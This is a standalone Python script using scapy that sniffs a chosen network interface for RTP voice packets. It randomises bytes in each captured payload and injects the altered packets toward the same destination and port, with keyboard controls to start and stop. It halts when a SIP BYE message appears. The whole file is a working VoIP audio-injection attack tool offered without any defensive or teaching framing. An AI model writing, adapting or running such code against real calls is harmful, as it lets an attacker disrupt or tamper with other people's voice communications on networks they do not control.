import threading
import keyboard  # For detecting key presses
from scapy.all import sniff, IP, UDP, Raw, send, get_if_addr
import random
import time
import psutil

stop_injection = True  # Initially stopped
rtp_started = False  # Flag to track RTP injection state
network_interface = None

def list_interfaces():
    interfaces = []
    print("\nAvailable Network Interfaces:")
    for idx, (name, addrs) in enumerate(psutil.net_if_addrs().items()):
        print(f"{idx + 1}. {name}")
        interfaces.append(name)
    return interfaces

def select_interface():
    global network_interface
    interfaces = list_interfaces()
    while True:
        try:
            choice = int(input("Select the network interface (number): ")) - 1
            if 0 <= choice < len(interfaces):
                network_interface = interfaces[choice]
                return
            else:
                print("Invalid selection. Try again.")
        except ValueError:
            print("Please enter a valid number.")

def generate_dynamic_payload(payload):
    payload = bytearray(payload)
    for i in range(12, len(payload), 8):  # Skip RTP header (12 bytes)
        payload[i] = random.randint(0, 255)
    return bytes(payload)

def inject_rtp_packet(original_packet):
    global stop_injection, rtp_started
    if stop_injection or Raw not in original_packet:
        return
    rtp_started = True  # Mark RTP injection as active
    
    captured_payload = original_packet[Raw].load
    dynamic_payload = generate_dynamic_payload(captured_payload)
    
    src_ip = original_packet[IP].src
    dst_ip = original_packet[IP].dst
    dst_port = original_packet[UDP].dport
    
    ip = IP(src=get_if_addr(network_interface), dst=dst_ip)
    udp = UDP(sport=random.randint(1024, 65535), dport=dst_port)
    packet = ip / udp / Raw(load=dynamic_payload)
    
    send(packet, verbose=False)
    print(f"Injected modified RTP packet to {dst_ip}:{dst_port}")

def packet_callback(packet):
    global stop_injection, rtp_started
    if stop_injection:
        return
    if UDP in packet and Raw in packet:
        payload = packet[Raw].load
        if rtp_started and b"BYE" in payload:
            print("SIP BYE detected. Stopping injection.")
            stop_injection = True
        rtp_payload_type = payload[1] & 0x7F
        if 96 <= rtp_payload_type <= 127:
            print(f"Captured RTP packet from {packet[IP].src}:{packet[UDP].sport}")
            inject_rtp_packet(packet)

def start_sniffing():
    print(f"Sniffing for RTP packets on {network_interface}...")
    sniff(iface=network_interface, filter="udp", prn=packet_callback, store=False)

def user_control():
    global stop_injection
    print("\nPress 's' to start RTP injection, 'e' to stop it, and 'q' to quit.")
    while True:
        if keyboard.is_pressed('s'):
            if stop_injection:
                print("\n[+] Starting RTP injection...")
                stop_injection = False
                sniff_thread = threading.Thread(target=start_sniffing, daemon=True)
                sniff_thread.start()
        elif keyboard.is_pressed('e'):
            if not stop_injection:
                print("\n[-] Stopping RTP injection...")
                stop_injection = True
        elif keyboard.is_pressed('q'):
            print("\n[!] Quitting...")
            stop_injection = True
            exit()
        time.sleep(0.2)

if __name__ == "__main__":
    select_interface()
    user_control()
